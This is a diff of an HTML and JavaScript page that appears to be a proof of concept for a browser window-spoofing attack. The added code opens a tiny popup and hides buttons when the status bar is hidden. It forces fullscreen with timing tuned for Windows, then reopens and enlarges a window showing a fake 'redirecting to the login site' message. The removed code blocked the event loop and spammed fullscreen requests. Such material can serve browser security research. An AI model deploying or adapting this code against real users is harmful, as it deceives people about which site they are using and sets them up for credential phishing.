@@ -1,61 +1,49 @@
+<style>
+
+</style>
 <script>
-var spoofWindow;
+  var spoofWindow;
+  var spoofDelay;
 
-function launchInPopup() {
-    window.open(location.href, "", "newWindow")
-}
+  if(!statusbar.visible) {
+      window.document.styleSheets[0].insertRule("button { display: none }")
+  }
 
-function calculatePrimes(iterations, multiplier) {
-    var primes = [];
-    for (var i = 0; i < iterations; i++) {
-        var candidate = i * (multiplier * Math.random());
-        var isPrime = true;
-        for (var c = 2; c <= Math.sqrt(candidate); ++c) {
-            if (candidate % c === 0) {
-                // not prime
-                isPrime = false;
-                break;
-            }
-        }
-        if (isPrime) {
-            primes.push(candidate);
-        }
-    }
-    return primes;
-}
+  if (navigator.platform.includes("Win")) {
+    spoofDelay = 255;
+  } else {
+    spoofDelay = 30;
+  }
 
-function blockEventLoop() {
-    calculatePrimes(2010000, 1000000)
-}
+  async function launchPopup() {
+      spoofWindow = window.open(
+      location.href,
+      "popup",
+      "height=1,width=1"
+    )
+    await new Promise(r => setTimeout(r, 65));
+    spoofWindow.document.styleSheets[0].insertRule("button { display: none }")
+  }
 
-function launchOrRefocus() {
-     spoofWindow = window.open("https://www.example.com", "spoofWindow" , "newWindow")
-}
+  async function reusePopupSpoof() {
+      document.documentElement.requestFullscreen()
 
-function rfs() {
-  setInterval(function(){ 
-      document.documentElement.requestFullscreen();
-    },1)
-}
+      await new Promise(r => setTimeout(r, spoofDelay));
+
+      spoofWindow = window.open(
+      location.href,
+      "popup",
+      ""
+    )
+
+    spoofWindow.document.write("Please wait while we redirecting to the login site..")
+    spoofWindow.moveTo(0, 0)
+    spoofWindow.resizeTo(screen.availHeight*2, screen.availWidth*2)
+
+    await new Promise(r => setTimeout(r, spoofDelay+3333));
+    spoofWindow.close();
+
+  }
 </script>
-
-
-<button onmousedown="launchInPopup()">
-    Launch Main Window
-  </button>
-
-<button onmousedown="launchOrRefocus()">
-    Launch Spoof Window
-  </button>
-
-  <button onclick="blockEventLoop()">
-    Block Event Loop
-  </button>
-  
-  <button onmousedown="rfs()">
-    requestFullscreen
-  </button>
-  
-  <button onmousedown="launchOrRefocus()">
-    reFocus
-</button>
+<button onclick="launchPopup()">Launch Popup</button>
+<button onclick="reusePopupSpoof()">Reuse Popup Spoof</button>
